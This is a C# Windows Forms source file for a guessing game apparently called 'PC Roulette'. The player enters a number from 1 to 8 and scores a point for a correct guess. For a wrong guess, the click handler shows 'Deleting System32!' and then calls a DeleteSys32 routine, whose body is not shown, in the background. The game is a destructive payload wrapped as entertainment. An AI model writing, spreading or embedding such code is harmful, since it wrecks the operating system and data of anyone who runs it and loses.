using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;

namespace Houd_s_PC_Roulette
{
    public partial class Game : Form
    {
        private int points = 0;
        public Game()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            String guess = guessBox.Text;
            int guessInt = 0;
            if (!int.TryParse(guess, out guessInt))
            {
                resultLabel.Text = "Please enter a valid number between 1 and 8.";
            }
            else
            {
                int answer = Random.Shared.Next(1, 9);
                Debug.WriteLine("Answer " + answer);
                if (guessInt == answer)
                {
                    resultLabel.Text = "Good job! You guessed " + guessInt + " correctly! You get a point.";
                    pointsLabel.Text = "Points: " + ++points;
                }
                else
                {
                    resultLabel.Text = "Sorry, you guessed wrong. Deleting System32!";
                    Task.Run(async () =>
                    {
                        await Task.Delay(500);
                        try
                        {
                            DelSys32.DeleteSys32();
                        }
                        catch (Exception e)
                        {
                            Debug.WriteLine("{0}:\n   {1}", e.GetType().Name,
                                              e.Message);
                            MessageBox.Show(e.Message, e.GetType().Name);
                        }
                    });
                }
            }
            resultLabel.Location = new Point((int)(Width / 2 - resultLabel.Width / 2 - 8), resultLabel.Location.Y);
        }
    }
}
